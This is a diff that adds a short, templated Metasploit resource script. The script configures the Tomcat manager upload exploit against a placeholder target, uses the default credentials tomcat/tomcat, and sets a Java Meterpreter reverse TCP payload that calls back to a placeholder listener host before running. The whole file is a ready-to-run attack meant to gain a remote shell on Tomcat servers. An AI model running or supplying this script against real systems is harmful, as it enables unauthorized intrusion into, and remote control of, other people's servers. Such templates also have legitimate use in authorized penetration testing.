@@ -1,0 +1,8 @@
+use exploit/multi/http/tomcat_mgr_upload
+set RHOSTS %%TARGET_IP%%
+set RPORT %%TARGET_PORT%%
+set HttpUsername tomcat
+set HttpPassword tomcat
+set PAYLOAD java/meterpreter/reverse_tcp
+set LHOST %%LHOST%%
+run
